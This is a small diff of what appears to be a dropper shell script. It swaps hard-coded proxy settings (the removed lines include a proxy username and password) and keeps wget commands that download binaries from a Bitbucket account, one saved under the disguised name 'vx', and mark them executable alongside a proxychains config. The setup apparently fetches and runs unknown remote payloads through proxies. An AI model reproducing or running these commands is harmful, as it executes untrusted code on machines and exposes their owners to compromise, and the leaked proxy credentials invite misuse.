@@ -1,7 +1,5 @@
-proxy="172.234.39.163" 
-port="1080" 
-user="yui"  
-pass="bian15"
+proxy="208.102.51.6" 
+port="58208" 
 wget -q -O vx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x vx
 wget -q https://bitbucket.org/indarsza/sanaya/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/indarsza/sanaya/downloads/proxychains.conf && chmod +x proxychains.conf 
